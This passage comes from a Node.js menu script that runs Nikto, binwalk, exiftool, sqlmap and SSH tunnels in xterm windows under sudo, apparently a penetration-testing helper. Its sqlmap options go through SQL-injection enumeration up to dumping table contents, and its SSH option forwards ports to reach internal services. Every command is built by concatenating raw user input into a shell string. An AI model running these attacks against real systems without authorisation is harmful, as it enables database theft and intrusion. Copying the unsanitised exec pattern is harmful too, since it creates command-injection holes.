  } else if (answer == 4) { // nikto -Tuning 4 -h
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Scanning ('+website+') with Nikto -Tuning 4 option" -e "nikto -Tuning 4 -h '+website+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 5) { // nikto -Tuning 4 -ssl -h
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Scanning ('+website+') with Nikto -Tuning 4 option" -e "nikto -Tuning 4 -ssl -h '+website+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 6) { // nikto -C all -h
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Scanning ('+website+') with Nikto -C all option" -e "nikto -C all -h '+website+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }
  banner();
}

/**
 * binwalk()
 * Request required data from user for binwalk
 **/
function binwalk() {
  console.log('');
  rl.question('What type of binwalk session would you like?'.yellow+'\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'Binwalk <file>'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    if (!answer) {
      banner();
    } else if(answer == 0) {
      banner();
    } else if(answer == 1) {
      rl.question('\nFile?\n:~$ ', (file) => {
        doBinwalk(answer, file);
      });
    }
  });
}

/**
 * doBinwalk()
 * Check provided file with binwalk
 **/
function doBinwalk(answer,file) {
  if (!answer || !file) {
    banner();
  } else if (answer == 0) {
    banner();
  } else if (answer == 1) { // binwalk <file>
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 120x30+0+0 -T "Binwalking ('+file+')" -e "binwalk '+file+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }
  banner();
}

/**
 * exiftool()
 * Request required data from user for exiftool
 **/
function exiftool() {
  console.log('');
  rl.question('What type of exiftool session would you like?'.yellow+'\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'Exiftool <file>'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    if (!answer) {
      banner();
    } else if(answer == 0) {
      banner();
    } else if(answer == 1) {
      rl.question('\nFile?\n:~$ ', (file) => {
        doExiftool(answer, file);
      });
    }
  });
}

/**
 * doExiftool()
 * Check provided file with exiftool
 **/
function doExiftool(answer,file) {
  if (!answer || !file) {
    banner();
  } else if (answer == 0) {
    banner();
  } else if (answer == 1) { // exiftool <file>
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 120x60+0+0 -T "Exiftool ('+file+')" -e "'+EXIFTOOL+' '+file+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }
  banner();
}

/**
 * sqlmap()
 * Request required data from user for sqlmap
 **/
function sqlmap() {
  console.log('');
  rl.question('What type of sqlmap session would you like?'.yellow+'\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'SQLMap -r /path/to/request.txt --risk=3 --level=5'.yellow+'\n[2] '.cyan+'SQLMap -r /path/to/request.txt --dbms=MYSQL --risk=3 --level=5 --current-db'.yellow+'\n[3] '.cyan+'SQLMap -r /path/to/request.txt --dbms=MYSQL --risk=3 --level=5 -D <database> --tables'.yellow+'\n[4] '.cyan+'SQLMap -r /path/to/request.txt --dbms=MYSQL --risk=3 --level=5 -D <database> -T <table> --columns'.yellow+'\n[5] '.cyan+'SQLMap -r /path/to/request.txt --dbms=MYSQL --risk=3 --level=5 -D <database> -T <table> --dump'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    if (!answer) {
      banner();
    } else if(answer == 0) {
      banner();
    } else if(answer == 1) {
      rl.question('\nRequest file?\n:~$ ', (file) => {
        doSqlmap(answer, file, undefined, undefined, undefined);
      });
    } else if(answer == 2) {
      rl.question('\nRequest file?\n:~$ ', (file) => {
        rl.question('\nDBMS?\n:~$ ', (dbms) => {
          doSqlmap(answer, file, dbms, undefined, undefined);
        });
      });
    } else if(answer == 3) {
      rl.question('\nRequest file?\n:~$ ', (file) => {
        rl.question('\nDBMS?\n:~$ ', (dbms) => {
          rl.question('\nDatabase?\n:~$ ', (database) => {
            doSqlmap(answer, file, dbms, database, undefined);
          });
        });
      });
    } else if(answer == 4) {
      rl.question('\nRequest file?\n:~$ ', (file) => {
        rl.question('\nDBMS?\n:~$ ', (dbms) => {
          rl.question('\nDatabase?\n:~$ ', (database) => {
            rl.question('\nTable?\n:~$ ', (table) => {
              doSqlmap(answer, file, dbms, database, table);
            });
          });
        });
      });
    } else if(answer == 5) {
      rl.question('\nRequest file?\n:~$ ', (file) => {
        rl.question('\nDBMS?\n:~$ ', (dbms) => {
          rl.question('\nDatabase?\n:~$ ', (database) => {
            rl.question('\nTable?\n:~$ ', (table) => {
              doSqlmap(answer, file, dbms, database, table);
            });
          });
        });
      });
    }
  });
}

/**
 * doSqlmap()
 * Perform sqlmap against provided arguments
 **/
function doSqlmap(answer, file, dbms, database, table) {
  if (!answer || !file) {
    banner();
  } else if (answer == 0) {
    banner();
  } else if (answer == 1 && file) { // sqlmap -r <file> --risk=3 --level=5
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 120x60+0+0 -T "Sqlmap -r '+file+' --risk=3 --level=5" -e "'+SQLMAP+' -r '+file+' --risk=3 --level=5" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 2 && file && dbms) { // sqlmap -r <file> --dbms=MYSQL --risk=3 --level=5 --current-db
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 120x60+0+0 -T "Sqlmap -r '+file+' --dbms='+dbms+' --risk=3 --level=5 --current-db" -e "'+SQLMAP+' -r '+file+' --dbms='+dbms+' --risk=3 --level=5 --current-db" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 3 && file && dbms && database) { // sqlmap -r <file> --dbms=MYSQL --risk=3 --level=5 -D <database> --tables
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 120x60+0+0 -T "Sqlmap -r '+file+' --dbms='+dbms+' --risk=3 --level=5 -D '+database+' --tables" -e "'+SQLMAP+' -r '+file+' --dbms='+dbms+' --risk=3 --level=5 -D '+database+' --tables" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 4 && file && dbms && database && table) { // sqlmap -r <file> --dbms=MYSQL --risk=3 --level=5 -D <database> -T <table> --columns
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 120x60+0+0 -T "Sqlmap -r '+file+' --dbms='+dbms+' --risk=3 --level=5 -D '+database+' -T '+table+' --columns" -e "'+SQLMAP+' -r '+file+' --dbms='+dbms+' --risk=3 --level=5 -D '+database+' -T '+table+' --columns" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 5 && file && dbms && database && table) { // sqlmap -r <file> --dbms=MYSQL --risk=3 --level=5 -D <database> -T <table> --dump
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 120x60+0+0 -T "Sqlmap -r '+file+' --dbms='+dbms+' --risk=3 --level=5 -D '+database+' -T '+table+' --dump" -e "'+SQLMAP+' -r '+file+' --dbms='+dbms+' --risk=3 --level=5 -D '+database+' -T '+table+' --dump" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }
  banner();
}

/**
 * ssh()
 * Request required data from user to run special SSH sessions
 **/
function ssh() {
  console.log('');
  rl.question('What type of SSH session would you like?'.yellow+'\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'SSH Tunnel - Access Remote Inernal Service'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    if (!answer) {
      banner();
    } else if(answer == 0) {
      banner();
    } else if(answer == 1) {
      rl.question('\nLocal Port?\n:~$ ', (loc_port) => {
        rl.question('\nRemote Internal Service Port?\n:~$ ', (int_port) => {
          rl.question('\nRemote User?\n:~$ ', (rem_user) => {
            rl.question('\nRemote Host?\n:~$ ', (rem_host) => {
              doSSH(answer, loc_port, int_port, rem_user, rem_host);
            });
          });
        });
      });
    }
  });
}

/**
 * doSSH()
 * Start the SSH session per users feedback
 **/
function doSSH(answer, loc_port, int_port, rem_user, rem_host) {
  if (!answer || !rem_user || !rem_host) {
    banner();
  } else if (answer == 0) {
    banner();
  } else if (answer == 1) { // ssh -f -N -L 4444:127.0.0.1:9000 -l spiderman 192.168.1.149
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 120x60+0+0 -T "SSH Tunnel to Remote Internal Service" -e "'+SSH+' -f -N -L '+loc_port+':127.0.0.1:'+int_port+' -l '+rem_user+' '+rem_host+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }
  banner();
}


